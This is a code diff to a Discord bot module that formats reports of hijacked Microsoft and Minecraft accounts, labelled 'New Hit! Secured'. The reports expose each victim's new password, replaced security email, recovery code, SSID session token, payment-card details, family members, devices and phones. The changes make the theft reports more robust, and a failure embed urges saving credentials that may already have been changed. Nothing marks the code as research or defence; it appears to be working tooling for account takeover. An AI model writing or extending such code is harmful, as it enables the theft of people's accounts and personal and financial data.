@@ -6,15 +6,44 @@ from urllib.parse import quote
 from discord import Embed
 import time
 
+
+def build_failure_embed(email: str, ms: dict, reason: str, *, error: str | None = None) -> Embed:
+    detail = error or reason
+    embed = Embed(
+        title="Failed to secure account",
+        description=reason,
+        color=0xFA4343,
+    )
+    embed.add_field(name="Error", value=f"```{detail[:1000]}```", inline=False)
+    embed.add_field(name="Original Email", value=f"```{email}```", inline=False)
+    if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
+        embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
+    if ms.get("password") and ms["password"] != "Couldn't Change!":
+        embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
+    if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
+        embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
+    embed.set_footer(text="Save these credentials — the password may already have been changed.")
+    return embed
+
+
+def _field(obj: dict, *keys: str, default: str = "Unknown") -> str:
+    for key in keys:
+        val = obj.get(key)
+        if val not in (None, ""):
+            return str(val)
+    return default
+
+
 async def build_account_embeds(account: dict, elapsed: float = 0, account_id: str = "") -> dict:
-    name = quote(account["minecraft"]["name"])
+    mc = account.get("minecraft", {})
+    name = quote(mc.get("name") or "Unknown")
 
     ms = account["microsoft"]
     family = ms["family"]
     devices = ms["devices"]
     cards = ms["cards"]
     subs = ms["subscriptions"]
-    phones = ms["phones"]
+    phones = ms.get("phones", [])
 
     active_subs = [(s, "Active") for s in subs["active"]]
     canceled_subs = [(s, "Canceled") for s in subs["canceled"]]
@@ -35,7 +64,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         for key, member in enumerate(family, 1):
             family_embed.add_field(
                 name=f"Member {key}", 
-                value=f"```{member["display"]}\n{member["email"]}\nRole: {member["role"]}```", 
+                value=f"```{_field(member, 'display', 'name')}\n{_field(member, 'email')}\nRole: {_field(member, 'role')}```", 
                 inline=True
             )
     else:
@@ -47,7 +76,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         for key, device in enumerate(devices, 1):
             devices_embed.add_field(
                 name=f"Device {key}", 
-                value=f"```{device["model"]}\n{device["name"]}```",
+                value=f"```{_field(device, 'model')}\n{_field(device, 'name')}```",
                 inline=True
             )
     else:
@@ -59,7 +88,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         for key, card in enumerate(cards, 1):
             cards_embed.add_field(
                 name=f"Card {key}",
-                value=f"```{card["paymentMethodType"]} *{card["lastFourDigits"]}\nExpiry: {card["expirationDate"]}```",
+                value=f"```{_field(card, 'paymentMethodType')} *{_field(card, 'lastFourDigits', default='????')}\nExpiry: {_field(card, 'expirationDate', default='N/A')}```",
                 inline=True
             )
     else:
@@ -70,7 +99,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         for key, phone in enumerate(phones, 1):
             phones_embed.add_field(
                 name=f"Phone {key}",
-                value=f"```{phone["phone"]}\n{phone["id"]}```",
+                value=f"```{_field(phone, 'phone')}\n{_field(phone, 'id')}```",
                 inline=True
             )
     else:
@@ -81,7 +110,7 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         for key, (sub, status) in enumerate(all_subs, 1):
             subscriptions_embed.add_field(
                 name=f"Sub {key}",
-                value=f"```{status}\n{sub["productName"]}```",
+                value=f"```{status}\n{_field(sub, 'productName', 'title', 'name', 'offerName', 'productTitle', 'friendlyName')}```",
                 inline=True
             )
     else:
@@ -91,15 +120,15 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     dstats = await get_donut_stats(name)
 
     stats_embed = Embed(color=0x279CF5)
-    stats_embed.add_field(name="Rank", value=f'{hstats["hypixel"]["rank"]}', inline=True)
-    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats["hypixel"]["level"])}', inline=True)
-    stats_embed.add_field(name="Gifted", value=f'{hstats["hypixel"]["gifted"]}', inline=True)
-    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["skyblock"]["networth"])}', inline=True)
-    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["skyblock"]["level"])}', inline=True)
+    stats_embed.add_field(name="Rank", value=f'{hstats.get("hypixel", {}).get("rank", "N/A")}', inline=True)
+    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats.get("hypixel", {}).get("level", 0))}', inline=True)
+    stats_embed.add_field(name="Gifted", value=f'{hstats.get("hypixel", {}).get("gifted", 0)}', inline=True)
+    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats.get("skyblock", {}).get("networth", 0))}', inline=True)
+    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats.get("skyblock", {}).get("level", 0))}', inline=True)
     stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)
 
     xbox_embed = Embed(color=0x107C10, title="Xbox Info")
-    xbox_embed.add_field(name="Gamertag", value=f"```{account['minecraft']['gamertag']}```", inline=False)
+    xbox_embed.add_field(name="Gamertag", value=f"```{mc.get('gamertag', 'Not Found')}```", inline=False)
 
     hit_embed = Embed(
         title=f"New Hit! Secured in {round(elapsed, 2)}s",
@@ -112,9 +141,9 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
         ),
         color=0x279CF5
     )
-    hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
-    hit_embed.add_field(name="MC Method", value=f"```{account['minecraft']['method']}```", inline=True)
-    hit_embed.add_field(name="MC Capes", value=f"```{account['minecraft']['capes']}```", inline=True)
+    hit_embed.add_field(name="MC Username", value=f"```{mc.get('name', 'No Minecraft')}```", inline=False)
+    hit_embed.add_field(name="MC Method", value=f"```{mc.get('method', 'Unknown')}```", inline=True)
+    hit_embed.add_field(name="MC Capes", value=f"```{mc.get('capes', 'No capes')}```", inline=True)
     hit_embed.add_field(name="Primary Email", value=f"```{ms['email']}```", inline=False)
     hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
     hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
@@ -125,18 +154,18 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     ssid_embed = Embed(
         title="SSID"
     )
-    if account["minecraft"]["SSID"]:
-        ssid_embed.description = f"```{account['minecraft']['SSID'] }```"
+    if mc.get("SSID"):
+        ssid_embed.description = f"```{mc['SSID']}```"
     else:
         ssid_embed.description = "This account does not have a SSID."
 
-    if account["minecraft"]["SSID"]:
+    if mc.get("SSID"):
         hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")
 
     return {
         "hit_embed": hit_embed,
         "account_id": account_id,
-        "minecraft": account["minecraft"],
+        "minecraft": mc,
         "details": {
             "stats_embed": stats_embed,
             "ssid_embed": ssid_embed,
@@ -148,9 +177,9 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
             "subs_embed": subscriptions_embed,
             "phones_embed": phones_embed,
             "account_details": (
-                f"**Username:** {account['minecraft']['name']}\n"
-                f"**Has MC:** {True if account['minecraft']['SSID'] else False}\n"
-                f"**Capes:** {account['minecraft']['capes']}\n"
+                f"**Username:** {mc.get('name', 'No Minecraft')}\n"
+                f"**Has MC:** {bool(mc.get('SSID'))}\n"
+                f"**Capes:** {mc.get('capes', 'No capes')}\n"
                 f"**Email:** {ms['email']}\n"
                 f"**Security Email:** {ms['security_email']}\n"
                 f"**Password:** {ms['password']}\n"
